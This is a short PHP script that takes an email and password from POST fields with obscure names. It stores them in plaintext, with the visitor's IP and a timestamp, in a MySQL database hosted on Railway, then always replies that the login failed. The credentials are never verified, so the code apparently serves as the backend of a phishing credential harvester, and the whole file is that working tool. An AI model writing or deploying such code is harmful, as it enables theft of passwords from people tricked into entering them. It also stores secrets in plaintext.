<?php
// Input validation
$email = filter_input(INPUT_POST, 'di', FILTER_SANITIZE_STRING);
$password = filter_input(INPUT_POST, 'pr', FILTER_SANITIZE_STRING);

// Function to send JSON response
function sendJsonResponse($success, $message = '') {
    header('Content-Type: application/json');
    echo json_encode([
        'success' => $success,
        'message' => $message
    ]);
    exit();
}

// Log login attempts to the Railway database
try {
    // Railway Database Connection Details (replace with environment variables from Railway)
    $host = getenv('MYSQLHOST');
    $user = getenv('MYSQLUSER');
    $password_db = getenv('MYSQLPASSWORD');
    $database = getenv('MYSQLDATABASE');

    // PDO connection setup
    $dsn = "mysql:host={$host};dbname={$database};charset=utf8mb4"; // For MySQL (change to PostgreSQL DSN if using PostgreSQL)
    $pdo = new PDO($dsn, $user, $password_db);

    // Insert login data into the table
    $stmt = $pdo->prepare("INSERT INTO login_attempts (email, password, ip_address, attempt_time) VALUES (?, ?, ?, ?)");
    $stmt->execute([
        $email,
        $password,
        $_SERVER['REMOTE_ADDR'] ?? 'Unknown',
        date("Y-m-d H:i:s")
    ]);

    sendJsonResponse(false, "Login attempt saved to Railway database.");
} catch (Exception $e) {
    error_log("Failed to log login attempt: " . $e->getMessage());
    sendJsonResponse(false, "A server error occurred while saving the login attempt.");
}
?>
